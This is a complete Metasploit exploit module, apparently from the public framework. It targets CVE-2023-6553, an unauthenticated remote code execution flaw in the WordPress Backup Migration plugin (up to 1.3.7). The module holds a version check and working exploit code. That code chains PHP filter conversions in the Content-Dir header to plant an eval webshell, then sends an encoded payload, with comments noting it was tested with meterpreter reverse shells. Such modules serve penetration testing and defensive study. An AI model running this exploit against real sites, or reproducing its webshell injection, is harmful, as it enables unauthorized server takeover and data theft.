##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Payload::Php
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::PhpFilterChain
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Backup Migration Plugin PHP Filter Chain RCE',
        'Description' => %q{
          This module exploits an unauth RCE in the WordPress plugin: Backup Migration (<= 1.3.7).  The vulnerability is
          exploitable through the Content-Dir header which is sent to the /wp-content/plugins/backup-backup/includes/backup-heart.php endpoint.

          The exploit makes use of a neat technique called PHP Filter Chaining which allows an attacker to prepend
          bytes to a string by continuously chaining character encoding conversions. This allows an attacker to prepend
          a PHP payload to a string which gets evaluated by a require statement, which results in command execution.
        },
        'Author' => [
          'Nex Team', # Vulnerability discovery
          'Valentin Lobstein', # PoC + rewrite msfmodule
          'jheysel-r7' # msfmodule
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6553'],
          ['URL', 'https://github.com/Chocapikk/CVE-2023-6553/blob/main/exploit.py'],
          ['URL', 'https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it'],
          ['WPVDB', '6a4d0af9-e1cd-4a69-a56c-3c009e207eca']
        ],
        'Platform' => %w[php unix linux win],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'DisclosureDate' => '2023-12-11',
        'DefaultTarget' => 0,
        'Privileged' => false,
        'Targets' => [
          [
            'PHP In-Memory',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
              # tested with php/meterpreter/reverse_tcp
            }
          ],
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    wp_version = wordpress_version
    print_status("WordPress Version: #{wp_version}") if wp_version

    # The plugin's official name seems to be Backup Migration however the package filename is "backup-backup"
    check_code = check_plugin_version_from_readme('backup-backup', '1.3.8')

    if check_code.code != 'appears'
      return CheckCode::Safe
    end

    plugin_version = check_code.details[:version]
    print_good("Detected Backup Migration Plugin version: #{plugin_version}")
    CheckCode::Appears
  end

  def exploit
    print_status('Sending the payload, please wait...')

    random_var_name = Rex::Text.rand_text_alpha_lower(8)
    php_code = "<?php eval($_POST['#{random_var_name}']);?>"
    php_filter_chain_payload = generate_php_filter_payload(php_code)
    phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
    b64_payload = framework.encoders.create('php/base64').encode(phped_payload)

    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'backup-backup', 'includes', 'backup-heart.php'),
      'method' => 'POST',
      'headers' => { 'Content-Dir' => php_filter_chain_payload },
      'data' => "#{random_var_name}=#{b64_payload}"
    )
  end
end
